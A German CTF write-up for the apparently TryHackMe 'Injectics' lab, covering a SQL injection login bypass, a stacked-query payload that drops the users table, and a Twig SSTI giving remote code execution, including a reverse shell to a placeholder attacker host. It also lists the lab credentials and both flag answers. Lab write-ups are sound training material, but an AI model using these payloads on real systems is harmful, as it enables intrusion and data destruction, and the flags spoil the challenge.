# 📝 Injectics Write-up Zusammenfassung (ab `/mail.log`)

Mail.log enthält klare Anmeldedaten
- In `/mail.log` findest du zwei Accounts:
  ```
  superadmin@injectics.thm  | superSecurePasswd101
  dev@injectics.thm         | devPasswd123
  ```

SQLi im Login umgehen → erster Zugriff
- Das Login-Formular auf der Hauptseite filtert Schlüsselwörter wie `or`, `and`, `union`, `'` clientseitig – aber nur lowercase.
- Du umgehst das mit Payloads wie:
  ```
  username=' || 1=1 –-  (oder mit sleep für Zeit-basiert)
  ```
- Damit loggst du dich als „dev“-User ein.

 Zerstörung der `users`-Tabelle über Admin-SQLi
- Auf der Leaderboard-Seite (`edit_leaderboard.php`) kannst du Metadaten (z. B. gold, country) verändern – hier findet sich eine serverseitige SQLi-Lücke.
- Über einen Payload wie:
  ```
  gold=..., country=...; DROP TABLE users;-- -
  ```
  löschst du die gesamte `users`-Tabelle.

Automatische Wiedereinsetzung der Tabelle
- Der Dienst „injecticsService“ erkennt den Ausfall und stellt die Tabelle automatisch wieder her.
- Nach kurzer Wartezeit (1–2 Minuten) kannst du dich mit den Credentials aus `mail.log` als **superadmin** oder **admin** anmelden und bekommst damit **Flag 1**.

 SSTI im Admin-Bereich für RCE → Flag 2
- Im Admin-Dashboard gibt es ein Profil-Update, wo der Name angezeigt wird – und **SSTI** möglich ist (getestet mit `{{7*7}} → 49`).
- Über einen Twig-Trick (`sort('passthru')`) kannst du shell-Befehle ausführen, z. B.:
  ```jinja
  {{ ['bash -c "exec bash -i >& /dev/tcp/ATTACKER/PORT 0>&1"', ""] | sort('passthru') }}
  ```
  → Reverse Shell
- Alternativ kannst du die SSTI nutzen, um direkt Dateien auszulesen:
  ```jinja
  {{ ['cat /var/www/html/flags/XXXX.txt', ""] | sort('passthru') }}
  ```
  → Damit liest du **Flag 2** aus.

Flags & Endergebnis
- **Flag 1** (Admin-Panel): `THM{INJECTICS_ADMIN_PANEL_007}`
- **Flag 2** (Flag-Verzeichnis): `THM{5735172b6c147f4dd649872f73e0fdea}`
 Fazit
1. `/mail.log` → echte Admin-Creds  
2. SQLi → Login als dev  
3. SQLi im Leaderboard → `DROP TABLE users`  
4. Automatisch wiederhergestelltes Admin-Konto → Flag 1  
5. SSTI im Profil → RCE oder Datei-Lesen → Flag 2
